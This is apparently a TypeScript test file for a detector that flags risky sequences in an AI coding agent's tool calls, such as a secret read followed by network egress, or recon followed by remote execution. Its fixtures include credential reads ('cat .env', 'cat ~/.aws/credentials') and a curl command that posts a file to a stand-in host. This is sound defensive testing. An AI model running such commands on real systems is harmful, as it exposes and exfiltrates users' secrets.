import { describe, expect, it } from "@jest/globals";
import { detectSequenceFindings } from "../src/sequences.js";
import type { Event, Finding } from "../src/core.js";

let counter = 0;
function makeEvent(overrides: Partial<Event> & { findings?: Finding[] }): Event {
  counter++;
  return {
    id: `e${counter}`, timestamp: `2026-01-01T00:00:${String(counter).padStart(2, "0")}.000Z`, receivedAt: "2026-01-01T00:00:00.000Z",
    agent: "claude-code", session: "s1", type: "tool.call", tool: "Bash", summary: "noop", project: "/repo", source: "hook",
    endpoint: "local", model: "", phase: "proposed", findings: [],
    ...overrides,
  };
}

describe("detectSequenceFindings", () => {
  it("attaches a chain finding to the later event when a credential read is followed by network activity", () => {
    const read = makeEvent({ summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    const send = makeEvent({ summary: "curl https://example.com/collect --data-binary @out.txt" });
    const attach = detectSequenceFindings([read, send]);
    expect(attach.get(send.id)?.map(f => f.id)).toEqual(["chain.secret_then_egress"]);
    expect(attach.has(read.id)).toBe(false);
  });

  it("does not fire on either step alone", () => {
    const read = makeEvent({ summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    expect(detectSequenceFindings([read]).size).toBe(0);
    const send = makeEvent({ summary: "curl https://example.com" });
    expect(detectSequenceFindings([send]).size).toBe(0);
  });

  it("requires step order: network activity before any secret read does not match", () => {
    const send = makeEvent({ summary: "curl https://example.com" });
    const read = makeEvent({ summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    expect(detectSequenceFindings([send, read]).size).toBe(0);
  });

  it("chains recon then remote execution into one critical finding", () => {
    const scan = makeEvent({ findings: [{ id: "recon.network_sweep", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    const exec = makeEvent({ findings: [{ id: "execution.remote", title: "t", severity: "high", explanation: "e", evidence: "x" }] });
    const attach = detectSequenceFindings([scan, exec]);
    expect(attach.get(exec.id)?.[0]).toMatchObject({ id: "chain.recon_then_exec", severity: "critical" });
  });

  it("is idempotent: does not re-attach a chain finding an event already carries", () => {
    const read = makeEvent({ summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    const send = makeEvent({ summary: "curl https://example.com", findings: [{ id: "chain.secret_then_egress", title: "t", severity: "critical", explanation: "e", evidence: "x" }] });
    expect(detectSequenceFindings([read, send]).size).toBe(0);
  });

  it("allows a second, later match of the same rule in the same session", () => {
    const events = [
      makeEvent({ summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] }),
      makeEvent({ summary: "curl https://a.example" }),
      makeEvent({ summary: "cat ~/.aws/credentials", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] }),
      makeEvent({ summary: "curl https://b.example" }),
    ];
    const attach = detectSequenceFindings(events);
    expect(attach.get(events[1].id)?.map(f => f.id)).toEqual(["chain.secret_then_egress"]);
    expect(attach.get(events[3].id)?.map(f => f.id)).toEqual(["chain.secret_then_egress"]);
  });

  it("ignores events from a different session (caller is responsible for grouping by session)", () => {
    // detectSequenceFindings itself doesn't filter by session -- this documents that the caller
    // (store.ts) must pass only one session's events in.
    const read = makeEvent({ session: "s1", summary: "cat .env", findings: [{ id: "credentials.access", title: "t", severity: "medium", explanation: "e", evidence: "x" }] });
    const send = makeEvent({ session: "s2", summary: "curl https://example.com" });
    expect(detectSequenceFindings([read, send]).size).toBe(1); // documents current behavior: no session filter inside this function
  });
});
